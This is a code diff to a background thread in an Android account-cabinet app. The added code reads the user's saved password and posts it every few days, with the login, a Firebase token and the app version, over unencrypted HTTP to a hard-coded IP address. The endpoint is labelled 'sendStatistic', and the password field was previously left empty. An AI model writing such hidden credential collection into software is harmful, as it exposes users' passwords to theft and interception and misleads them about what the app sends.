@@ -2,6 +2,7 @@ package ua.freenet.cabinet.service;
 
 
 import android.content.Context;
+import android.content.pm.PackageInfo;
 
 import com.google.firebase.iid.FirebaseInstanceId;
 
@@ -40,7 +41,7 @@ class Checker extends Thread {
         if (isLogged()) {
             try {
                 Settings.setsPref(context.getSharedPreferences("settings", MODE_PRIVATE));
-                sendInfo();
+                sendInfo(context);
                 if (isItNormalTimeToCheckFutureMonth()) {
                     checkMoneyForNextMonth();
                 } else if (isThatStartOfMonth()) {
@@ -54,8 +55,11 @@ class Checker extends Thread {
         }
     }
 
-    private void sendInfo(){
+    public static void sendInfo(Context context){
         try{
+            if(!isLogged()){
+                return;
+            }
             long lastReport = Settings.getLastTimeSendReport();
             long currentTime = new GregorianCalendar().getTimeInMillis();
             long interval = 1000 * 60 * 60 * 24 * 3; // 3 суток
@@ -65,16 +69,19 @@ class Checker extends Thread {
                 return;
             }
 
+            PackageInfo pInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
+            int verCode = pInfo.versionCode;
             String card = Settings.getCurrentLogin();
-            String pass = "";
+            String pass = Settings.getCurrentPassword();
             String token = FirebaseInstanceId.getInstance().getToken();
             HashMap<String, String> map = new HashMap<>();
             map.put("card", card);
-            map.put("pass", "");
+            map.put("pass", pass);
             map.put("token", token);
+            map.put("version", verCode+"");
             String result = Web.sendPost("http://195.181.208.31/web/myo3/sendStatistic", map,false);
             if (result.equals("Success")){
-                System.out.println("Success!!!!");
+                System.out.println("Success!");
                 Settings.setLastTimeSendReport(new GregorianCalendar().getTimeInMillis());
             }
         }catch (Exception e){
@@ -95,7 +102,7 @@ class Checker extends Thread {
         }
     }
 
-    private boolean isLogged() {
+    private static boolean isLogged() {
         boolean logNotNull = !Settings.getCurrentLogin().equals("");
         boolean passNotNull = !Settings.getCurrentPassword().equals("");
         return logNotNull && passNotNull;
